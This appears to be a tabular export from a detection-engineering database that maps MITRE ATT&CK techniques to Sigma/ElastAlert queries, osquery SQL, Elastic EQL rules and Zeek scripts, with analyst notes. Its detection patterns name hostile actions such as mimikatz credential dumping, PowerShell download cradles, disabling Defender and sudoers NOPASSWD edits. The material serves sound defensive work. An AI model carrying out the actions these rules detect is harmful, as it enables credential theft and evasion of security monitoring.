102	yes	OSQuery	["Tried using LOG_INPUT and LOG_OUTPUT directives. For e.g. \n%sudo   ALL=(ALL:ALL) LOG_INPUT: LOG_OUTPUT: ALL\nUsed osquery config like below \n    "var_log": [\n      "/var/log/%.log"\n    ],\n    "var_sudo_log": [\n      "/var/log/sudo-io/%%/log"\n    ]\n", "Getting file events for sudo log files is not enough. Actual content of sudo log files might be useful and further correlation is required. \nReference: https://www.scip.ch/en/?labs.20150604\n", "Also, Need to try using auditd for auditing capabilities in linux."]	#800080	File monitoring,Process commandline parameters	{"accuracy_score": 50}	T1548.003	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [], "osquery": ["select * from file_events where target_path like '/var/log%';", "select * from file_events where target_path like '/etc/sudoers%';", "select * from process_events where cmdline like 'echo%' and cmdline like '%NOPASSWD%';"], "elasticsiem": ["event.category:process and event.type:start and process.args:(*NOPASSWD*ALL*)", "event.category:file and event.type:change and file.path:(/etc/sudoers* or /private/etc/sudoers*)"]}, "windows": {"other": [], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
3	yes	OSQuery,yaml	Process Monitoring. Detect for command line arguements for parameters - "DisableRealTimeMonitoring" OR "DisableBehaviorMonitoring	#800080	Process commandline parameters	"{'accuracy_score': 50}"	T1562.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_powershell_disable_windefender.yml", "elastalert": {"name": "powershell_disable_windows_defender_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:(*DisableRealtimeMonitoring* OR *DisableBehaviorMonitoring*) AND process.executable:*powershell.exe) AND (NOT ((process.parent.executable:\\".*\\\\PyCharm.*\\\\bin\\\\pycharm64.exe\\" OR process.parent.executable:\\".*\\\\JetBrains*\\\\.*.exe\\"))))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects Powershell command used to disable Window Defender"}}], "osquery": ["select * from file WHERE directory = 'C:\\\\Windows\\\\Prefetch\\\\' and filename like '%netsh.exe%';"], "elasticsiem": []}}}}}	2021-07-09 10:20:49.976666+00
101	yes	OSQuery		#008000	Process monitoring,Process use of network,Authentication logs	{"accuracy_score": 90}	T1135	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "net_exe_execution_0", "elastalert": {"name": "net_exe_execution_0", "type": "any", "alert": ["debug"], "index": "winlogbeat-*", "filter": [{"query_string": {"query": "(process.executable:(\\"*\\\\\\\\net.exe\\" OR \\"*\\\\\\\\net1.exe\\") AND winlog.event_id:(\\"4688\\" OR \\"1\\") AND process.command_line:(\\"*\\\\ group*\\" OR \\"*\\\\ localgroup*\\" OR \\"*\\\\ user*\\" OR \\"*\\\\ view*\\" OR \\"*\\\\ share*\\" OR \\"*\\\\ accounts*\\" OR \\"*\\\\ stop\\\\ *\\"))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects execution of Net.exe, whether suspicious or benign."}}], "osquery": [], "elasticsiem": []}}}}}	2021-08-03 13:31:09.60473+00
19	yes	other	P1	#0000FF	Packet capture	{"accuracy_score": 85}	T1571	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/zeek-vuln-scan-main"], "sigma": [{"rule": "possible_dns_rebinding_0", "elastalert": {"name": "possible_dns_rebinding_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\" AND event.code:\\"22\\" AND winlog.event_data.QueryName:\\"*\\" AND winlog.event_data.QueryStatus:\\"0\\" AND winlog.event_data.QueryResults:(\\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?10.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?192.168.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.16.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.17.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.18.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.19.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.20.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.21.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.22.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.23.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.24.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.25.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.26.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.27.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.28.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.29.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.30.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.31.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?127.*\\") AND (event.code:\\"22\\" AND winlog.event_data.QueryName:\\"*\\" AND winlog.event_data.QueryStatus:\\"0\\") AND (NOT (winlog.event_data.QueryResults:(\\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?10.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?192.168.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.16.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.17.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.18.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.19.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.20.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.21.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.22.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.23.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.24.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.25.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.26.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.27.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.28.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.29.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.30.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?172.31.*\\" OR \\"\\\\(\\\\:\\\\:ffff\\\\:\\\\)?127.*\\"))))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Detects several different DNS-answers by one domain with IPs from internal and external networks. Normally, DNS-answer contain TTL >100. (DNS-record will saved in host cache for a while TTL)."}}], "osquery": [], "elasticsiem": []}}}}}	2021-08-04 15:14:37.995471+00
124	yes	OSQuery	["1. We are able to track only when wmic was executed.", "2. processes or process_events didn't give output"] P1	#008000	Process monitoring,Process commandline parameters	{"accuracy_score": 90}	T1047	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "sigma": [{"rule": "mitre_bzar_indicators_for_execution_0", "elastalert": {"name": "mitre_bzar_indicators_for_execution_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarOpenPolicy2\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSUnbind\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSCrackNames\\") OR (dce_rpc.endpoint:\\"drsuapi\\" AND dce_rpc.operation:\\"DRSBind\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarClose\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarLookupNames\\") OR (dce_rpc.endpoint:\\"lsarpc\\" AND dce_rpc.operation:\\"LsarGetUserName\\") OR (dce_rpc.endpoint:\\"srvsvc\\" AND dce_rpc.operation:\\"NetrShareEnum\\") OR (dce_rpc.endpoint:\\"epmapper\\" AND dce_rpc.operation:\\"ept_map\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrCloseHandle\\") OR (dce_rpc.endpoint:\\"samr\\" AND dce_rpc.operation:\\"SamrConnect4\\") OR (dce_rpc.endpoint:\\"JobAdd\\" AND dce_rpc.operation:\\"atsvc\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcEnableTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRegisterTask\\") OR (dce_rpc.endpoint:\\"ITaskSchedulerService\\" AND dce_rpc.operation:\\"SchRpcRun\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethod\\") OR (dce_rpc.endpoint:\\"IWbemServices\\" AND dce_rpc.operation:\\"ExecMethodAsync\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"CreateServiceW\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceA\\") OR (dce_rpc.endpoint:\\"svcctl\\" AND dce_rpc.operation:\\"StartServiceW\\"))"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Windows DCE-RPC functions which indicate an execution techniques on the remote system. All credit for the Zeek mapping of the suspicious endpoint/operation field goes to MITRE"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%net%';", "select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%sc%';"], "elasticsiem": ["sequence by process.entity_id\\n  [process where process.name : \\"PsExec.exe\\" and event.type == \\"start\\"]\\n  [network where process.name : \\"PsExec.exe\\"]\\n", "sequence by process.entity_id with maxspan = 1m\\n  [process where event.type in (\\"start\\", \\"process_started\\") and\\n     (process.name : \\"sc.exe\\" or process.pe.original_file_name : \\"sc.exe\\") and\\n      process.args : \\"\\\\\\\\\\\\\\\\*\\" and process.args : (\\"binPath=*\\", \\"binpath=*\\") and\\n      process.args : (\\"create\\", \\"config\\", \\"failure\\", \\"start\\")]\\n  [network where process.name : \\"sc.exe\\" and destination.ip != \\"127.0.0.1\\"]\\n"]}, {"zeek": [], "other": [], "sigma": [], "osquery": [], "elasticsiem": []}]}}}}	2021-08-04 15:14:55.726575+00
458	yes	other	P1	#0000FF	Process use of network	{"accuracy_score": 80}	T1021.002	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb_report.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb1_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_smb2_detect.zeek"], "sigma": [{"rule": "first_time_seen_remote_named_pipe___zeek_0", "elastalert": {"name": "first_time_seen_remote_named_pipe___zeek_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(file.name:\\"spoolss\\" OR smb.path:\\\\\\\\*\\\\\\\\IPC$)"}}], "realert": {"minutes": 2}, "priority": 3, "description": "Detects the use of the spoolss named pipe over SMB. This can be used to trigger the authentication via NTLM of any machine that has the spoolservice enabled."}}], "osquery": [], "elasticsiem": []}, "windows": [{"zeek": [], "other": [], "sigma": [], "osquery": [], "elasticsiem": []}]}}}}	2021-08-04 15:15:12.071929+00
179	yes	other	["1. Microsoft Excel should be installed to emulate this attack.", "2. Need to setup a detonation chamber for opening email attachments."]\nP1	#800080	File monitoring,Packet capture,Network intrusion detection system,Detonation chamber,Email gateway,Mail server,Email gateway,Packet capture,Mail server	{"accuracy_score": 50}	T1566.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/pishing-detection-scripts.zip"], "sigma": [], "osquery": [], "elasticsiem": []}, "windows": {"other": ["[\\"1. NIDS and email gateways can be used to scan email attachments.\\", \\"2. Detonation chambers can be used to scan malicious attachments.\\", \\"3. Endpoint sensing or network sensing can detect malicious events once such attachment is opened.\\"]"], "sigma": [], "osquery": [], "elasticsiem": []}}}}}	2021-08-04 15:15:54.979124+00
171	yes	OSQuery	P1	#800080	Process monitoring,Network protocol analysis,Process use of network	{"accuracy_score": 70}	T1018	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_config_options.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_consts.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_detect.zeek", "git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master/scripts/bzar_dce-rpc_report.zeek"], "sigma": [{"rule": "windows_network_enumeration_0", "elastalert": {"name": "windows_network_enumeration_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(event.code:\\"1\\" AND winlog.channel:\\"Microsoft\\\\-Windows\\\\-Sysmon\\\\/Operational\\" AND (process.executable:(\\"*\\\\\\\\net.exe\\" OR \\"*\\\\\\\\net1.exe\\") AND process.command_line:\\"*view*\\") AND (NOT (process.command_line:\\"*\\\\\\\\\\\\\\\\*\\")))"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Identifies attempts to enumerate hosts in a network using the built-in Windows net.exe tool"}}, {"rule": "exploited_cve_2020_10189_zoho_manageengine_0", "elastalert": {"name": "exploited_cve_2020_10189_zoho_manageengine_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.parent.executable:*DesktopCentral_Server\\\\\\\\jre\\\\\\\\bin\\\\\\\\java.exe AND process.executable:(*\\\\\\\\cmd.exe OR *\\\\\\\\powershell.exe OR *\\\\\\\\bitsadmin.exe) AND winlog.event_id:(\\"4688\\" OR \\"1\\"))"}}], "realert": {"minutes": 0}, "priority": 1, "description": "Detects the exploitation of Zoho ManageEngine Desktop Central Java Deserialization vulnerability reported as CVE-2020-10189"}}], "osquery": [], "elasticsiem": []}, "windows": [{"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%net.exe%';"], "elasticsiem": []}]}}}}	2021-08-04 15:16:07.854399+00
43	yes	OSQuery	P1	#FFA500	Process monitoring	{"accuracy_score": 30}	T1560.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"linux": {"other": [], "sigma": [{"rule": "lnx_data_compressed.yml", "elastalert": {"name": "data_compressed_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:filebeat AND message:(*zip* OR *gzip* OR *tar*))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "An adversary may compress data (e.g., sensitive documents) that is collected prior to exfiltration in order to make it portable and minimize the amount of data sent over the network"}}], "osquery": [], "elasticsiem": []}, "network": {"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master"], "sigma": [{"rule": "git@10.11.93.198:/home/git/ACDS/Detection/Tools/Sigma/elastalert/network/zeek_http_exfiltration_compressed_files_elastalert.yml", "elastalert": "name: potential_exfiltration_of_compressed_files_0 description: This rule detects potential exfiltration by looking for a few compression extensions in the uri and signs of compression in the mime type, file type, and http body index: bhd10944_searchnode:so-* priority: 3 realert: minutes: 0 filter: - query_string: query: (((mime_types:*compressed AND uri:(*.7z OR *.zip OR *.rar)) OR filetype:*compressed) OR (http.bodyMagic:*compressed AND http.method:\\"PUT\\")) type: any alert: - debug"}], "osquery": [], "elasticsiem": []}, "windows": {"other": [], "sigma": [], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%MAKECAB%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.cmdline != '';"], "elasticsiem": []}}}}}	2021-08-04 15:20:22.323063+00
472	yes	\N	P1	#FFA500	Windows event logs	{"accuracy_score": 40}	T1003.006	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"network": [{"zeek": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/zeek/bzar-master"], "sigma": [{"rule": "possible_impacket_secretdump_remote_activity___zeek_0", "elastalert": {"name": "possible_impacket_secretdump_remote_activity___zeek_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(http.uri:*SYSTEM32\\\\\\\\* OR message:*.tmp OR http.uri:*\\\\\\\\* OR message:*ADMIN$*)"}}], "realert": {"minutes": 2}, "priority": 2, "description": "Detect AD credential dumping using impacket secretdump HKTL. Based on the SIGMA rules/windows/builtin/win_impacket_secretdump.yml"}}], "osquery": [], "elasticsiem": []}]}}}}	2021-08-04 15:20:38.790151+00
62	yes		["1. Monitoring Event tracing for windows required. Also need to monitor API calls for CreateProcess/CreateProcessA", Able to detect using python script -> "https://github.com/countercept/ppid-spoofing/blob/master/detect-ppid-spoof.py", "Need to explore ETW for windows"]\nelksiem EQL rule added as python script alternative.\nP1	#008000	API monitoring,Process monitoring,Windows event logs	{"accuracy_score": 90}	T1134.004	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": ["git@10.11.93.198:/home/git/ACDS/Detection/Misc/python/detect-ppid-spoof.py"], "sigma": [], "osquery": [], "elasticsiem": [{"name": "Parent Process PID Spoofing", "query": "/* This rule is compatible with Elastic Endpoint only */\\nsequence by host.id, user.id with maxspan=5m\\n [process where event.type == \\"start\\" and\\n  process.Ext.token.integrity_level_name != \\"system\\" and\\n  (\\n    process.pe.original_file_name : (\\"winword.exe\\", \\"excel.exe\\", \\"outlook.exe\\", \\"powerpnt.exe\\", \\"eqnedt32.exe\\",\\"fltldr.exe\\", \\"mspub.exe\\", \\"msaccess.exe\\", \\"powershell.exe\\", \\"pwsh.exe\\",\\n                                     \\"cscript.exe\\", \\"wscript.exe\\", \\"rundll32.exe\\", \\"regsvr32.exe\\", \\"msbuild.exe\\",\\n                                     \\"mshta.exe\\", \\"wmic.exe\\", \\"cmstp.exe\\", \\"msxsl.exe\\") or\\n    process.executable : (\\"?:\\\\\\\\Users\\\\\\\\*.exe\\",\\n                          \\"?:\\\\\\\\ProgramData\\\\\\\\*.exe\\",\\n                          \\"?:\\\\\\\\Windows\\\\\\\\Microsoft.NET\\\\\\\\*.exe\\",\\n                          \\"?:\\\\\\\\Windows\\\\\\\\Temp\\\\\\\\*.exe\\",\\n                          \\"?:\\\\\\\\Windows\\\\\\\\Tasks\\\\\\\\*\\") or\\n    process.code_signature.trusted != true\\n  )\\n  ] by process.pid\\n [process where event.type == \\"start\\" and process.parent.Ext.real.pid > 0 and\\n  not (process.name : \\"msedge.exe\\" and process.parent.name : \\"sihost.exe\\")\\n ] by process.parent.Ext.real.pid\\n"}]}}}}}	2021-08-19 13:42:27.094514+00
140	yes	OSQuery,yaml	Turn on powershell script block logging. P1	#008000	Process monitoring,Process commandline parameters,PowerShell logs,Process monitoring,PowerShell logs,Process commandline parameters,Process monitoring	{"accuracy_score": 90}	T1059.001	{"extensions": {"x-acds-detection-ext": {"x-os-names": {"windows": {"other": [], "sigma": [{"rule": "win_apt_babyshark.yml", "elastalert": {"name": "baby_shark_activity_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:(\\"reg query \\"HKEY_CURRENT_USER\\\\Software\\\\Microsoft\\\\Terminal\\\\ Server\\\\Client\\\\Default\\"\\" OR powershell.exe mshta.exe http* OR \\"cmd.exe /c taskkill /im cmd.exe\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects activity that could be related to Baby Shark malware"}}, {"rule": "sysmon_powershell_network_connection.yml", "elastalert": {"name": "powershell_network_connections_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process_path.keyword:*powershell.exe AND Initiated:\\"true\\") AND (NOT (dst_ip_addr.keyword:(10.* OR 192.168.* OR 172.16.* OR 172.17.* OR 172.18.* OR 172.19.* OR 172.20.* OR 172.21.* OR 172.22.* OR 172.23.* OR 172.24.* OR 172.25.* OR 172.26.* OR 172.27.* OR 172.28.* OR 172.29.* OR 172.30.* OR 172.31.* OR 127.0.0.1) AND dst_is_ipv6:\\"false\\" AND user_account:\\"NT\\\\AUTHORITY\\\\SYSTEM\\")))"}}], "realert": {"minutes": 0}, "priority": 4, "description": "Detects a Powershell process that opens network connections - check for suspicious target ports and target systems - adjust to your environment (e.g. extend filters with company's ip range')"}}, {"rule": "win_mimikatz_command_line.yml", "elastalert": {"name": "mimikatz_command_line_0_manoj", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.command_line:(*DumpCreds* OR \\"*invoke-mimikatz*\\") OR (process.command_line:(*rpc* OR *token* OR *crypto* OR *dpapi* OR *sekurlsa* OR *kerberos* OR *lsadump* OR *privilege* OR *process*)))"}}], "realert": {"minutes": 0}, "priority": 3, "description": "Detection well-known mimikatz command line arguments"}}, {"rule": "win_susp_ps_downloadfile.yml", "elastalert": {"name": "powershell_downloadfile_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(agent.type:winlogbeat AND process.command_line:(*powershell.exe* AND *Net.WebClient* AND *DownloadString*))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects the execution of powershell, a WebClient object creation and the invocation of DownloadFile in a single command line"}}, {"rule": "win_html_help_spawn.yml", "elastalert": {"name": "html_help_shell_spawn_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*cmd.exe OR *powershell.exe OR *wscript.exe OR *cscript.exe OR *regsvr32.exe OR *wmic.exe OR *rundll32.exe) AND process.parent.executable:\\"C\\\\:\\\\Windows\\\\hh.exe\\")"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects a suspicious child process of a Microsoft HTML Help system when executing compiled HTML files (.chm)"}}, {"rule": "powershell_suspicious_invocation_specific.yml", "elastalert": {"name": "suspicious_powershell_invocations___specific_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "((process.command_line:\\"*-nop*\\" AND process.command_line:\\"* -w *\\" AND process.command_line:*hidden* AND process.command_line:\\"* -c *\\" AND process.command_line:\\"*[Convert]::FromBase64String*\\") OR (process.command_line:\\"* -w *\\" AND process.command_line:*hidden* AND process.command_line:\\"*-ep*\\" AND process.command_line:*bypass* AND process.command_line:\\"*-Enc*\\") OR (process.command_line:\\"* -w *\\" AND process.command_line:*hidden* AND process.command_line:\\"*-noni*\\" AND process.command_line:\\"*-nop*\\" AND process.command_line:\\"* -c *\\" AND process.command_line:*iex* AND process.command_line:\\"*New-Object*\\") OR (process.command_line:*iex* AND process.command_line:\\"*New-Object*\\" AND process.command_line:\\"*Net.WebClient*\\" AND process.command_line:\\"*.Download*\\") OR (process.command_line:*powershell* AND process.command_line:*reg* AND process.command_line:*add* AND process.command_line:*HKCU\\\\software\\\\microsoft\\\\windows\\\\currentversion\\\\run*) OR (process.command_line:*bypass* AND process.command_line:\\"*-noprofile*\\" AND process.command_line:\\"*-windowstyle*\\" AND process.command_line:*hidden* AND process.command_line:\\"*new-object*\\" AND process.command_line:\\"*system.net.webclient*\\" AND process.command_line:\\"*.download*\\") OR (process.command_line:*bypass* AND process.command_line:\\"*-noprofile*\\" AND process.command_line:\\"*-ComObject*\\" AND process.command_line:*MsXml* AND process.command_line:\\"*new-object*\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects suspicious PowerShell invocation command parameters"}}, {"rule": "win_hack_bloodhound.yml", "elastalert": {"name": "bloodhound_and_sharphound_hack_tool_0", "type": "any", "alert": ["debug"], "index": "bhd10944_searchnode:so-*", "filter": [{"query_string": {"query": "(process.executable:(*Bloodhound.exe* OR *SharpHound.exe*) OR process.command_line:(\\"*-CollectionMethod All *\\" OR \\"*.exe -c All -d *\\" OR \\"*Invoke-Bloodhound*\\" OR \\"*Get-BloodHoundData*\\") OR (process.command_line:\\"*-JsonFolder *\\" AND process.command_line:\\"* -ZipFileName *\\") OR (process.command_line:\\"* DCOnly *\\" AND process.command_line:\\"* --NoSaveCache *\\"))"}}], "realert": {"minutes": 0}, "priority": 2, "description": "Detects command line parameters used by Bloodhound and Sharphound hack tools"}}], "custom": [{"filename": "win_invoke_apppathbypass_command_line_elastalert.yml", "elastalert": "name: invoke_apppathbyapss_command_line_0\\ndescription: Detection of invoke apppathbypass command line arguments\\nindex: bhd10944_searchnode:so-*\\npriority: 3\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (process.executable:*powershell.exe AND process.command_line:\\"*Invoke-AppPathBypass*\\")\\ntype: any\\nalert:\\n- debug\\n\\n\\n"}, {"filename": "powershell_multiple_commands_check_elastalert.yml", "elastalert": "name: powershell_process_command_line_args_check_0\\ndescription: Detects command execution using \\"powersell.exe\\".\\nindex: bhd10944_searchnode:so-*\\npriority: 2\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (process.executable:*powershell.exe AND process.command_line:\\"*Out-ATHPowerShellCommandLineParameter\\")\\ntype: any\\nalert:\\n- debug"}, {"filename": "powershell_new_session_creation_elastalert.yml", "elastalert": "name: powershell_process_command_line_args_check_for_new_session_0\\ndescription: Detects new session creation using \\"powersell.exe\\".\\nindex: bhd10944_searchnode:so-*\\npriority: 2\\nrealert:\\n  minutes: 0\\nfilter:\\n- query_string:\\n    query: (process.executable:*powershell.exe AND (process.command_line:\\"*New-PSSession*\\" AND \\"*Test-Connection*\\" AND \\"*Set-Content*\\" AND \\"*Get-Content*\\"))\\ntype: any\\nalert:\\n- debug"}], "osquery": ["select * from file WHERE directory = 'C:\\\\\\\\Windows\\\\\\\\Prefetch\\\\\\\\' and filename like '%POWERSHELL%';", "select pr.pid, pr.name, usr.username, pr.path, pr.cmdline from processes pr LEFT JOIN users usr ON pr.uid = usr.uid WHERE pr.name LIKE '%powershell%' AND pr.cmdline != '';", "select * from powershell_events;", "SELECT name as bad_parent_child_name, pid bad_parent_child_pid FROM processes WHERE pid=(SELECT parent FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='powershell.exe') OR pid=(SELECT pid FROM processes WHERE parent!=(SELECT pid from processes where name='explorer.exe') AND LOWER(name)='powershell.exe');", "select * from powershell_events where script_text like '%mimikatz%';", "select * from powershell_events where script_text like '%BloodHound%';"], "elasticsiem": ["sequence by host.id, process.entity_id with maxspan=30s\\n [network where process.name : \\"powershell.exe\\" and network.protocol == \\"dns\\" and\\n not dns.question.name : (\\"localhost\\", \\"*.microsoft.com\\", \\"*.azureedge.net\\", \\"*.powershellgallery.com\\", \\"*.windowsupdate.com\\", \\"metadata.google.internal\\") and \\n not user.domain : \\"NT AUTHORITY\\"]\\n [file where process.name : \\"powershell.exe\\" and event.type == \\"creation\\" and file.extension : (\\"exe\\", \\"dll\\", \\"ps1\\", \\"bat\\") and \\n not file.name : \\"__PSScriptPolicy*.ps1\\"]\\n", "process where event.type in (\\"start\\", \\"process_started\\") and\\n process.name : (\\"cmd.exe\\", \\"powershell.exe\\") and\\n process.parent.name 